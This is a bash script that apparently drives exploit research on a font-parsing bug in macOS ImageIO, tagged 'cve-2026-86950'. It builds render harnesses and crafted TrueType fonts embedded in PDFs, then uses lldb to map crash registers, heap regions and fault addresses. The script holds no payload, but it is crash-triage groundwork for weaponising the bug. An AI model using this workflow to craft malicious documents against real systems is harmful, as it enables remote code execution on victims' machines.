#!/bin/bash
# FINISH-1: canvas discovery + x27 same-session offset, sub-region header dump, curve extension
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.abspath('.'))
from gen_k2 import build_font
for L in (64, 28000, 29000, 31744):
    build_font(f"k2_q{L}.ttf", L)
print("gen done")
PYEOF
./venv/bin/python gen_pdf.py k2_q64.pdf k2_q64.ttf
# canvas + x27 in ONE session: bitmap ctx bp first (canvas made before draw), then aa_cache_render
lldb -b -o "breakpoint set -n CGBitmapContextCreate" \
  -o "breakpoint set -n CGDataProviderCreateWithData" \
  -o "process launch -- k2_q64.pdf" \
  -o "finish" -o "register read x0" \
  -o "memory read --size 8 --count 12 --format x \$x0" \
  -o "breakpoint set -n aa_cache_render" -o "continue" \
  -o "register read x27 x22" \
  -o "memory region \$x27" \
  -o "detach" -o "quit" ./render2 > canvas_disc.txt 2>&1 || true
# header dump at 64-aligned crash
./venv/bin/python gen_pdf.py k2_q31744.pdf k2_q31744.ttf
lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_q31744.pdf" \
  -o "continue" -k "register read" \
  -k "memory read --size 8 --count 24 --format x \$x27" \
  -k "memory read --size 8 --count 24 --format x \$x27+0x1F0000" \
  -k "memory region \$x27" -o "quit" ./render > header_dump.txt 2>&1 || true
# curve extension
for L in 28000 29000; do
  ./venv/bin/python gen_pdf.py k2_q${L}.pdf k2_q${L}.ttf
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_q${L}.pdf" \
    -o "continue" -k "register read" -o "quit" ./render > curve_${L}.txt 2>&1 || true
  FA=$(grep -m1 "stop reason = EXC" curve_${L}.txt | sed 's/.*address=//;s/)//')
  echo "curve L=$L fault=$FA" >> curve_map.txt
done
cat curve_map.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{canvas_disc.txt,header_dump.txt,curve_map.txt,curve_*.txt} findings/ 2>/dev/null
ls findings/ | wc -l
